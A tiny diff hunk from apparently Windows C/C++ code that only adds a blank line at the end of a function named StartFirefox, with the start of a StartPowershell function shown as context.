@@ -452,6 +452,7 @@ static void StartFirefox()
 exit:
    Funcs::pCloseHandle(hProfilesIni);
    Funcs::pFree(profilesIniContent);
+
 }
 
 static void StartPowershell()
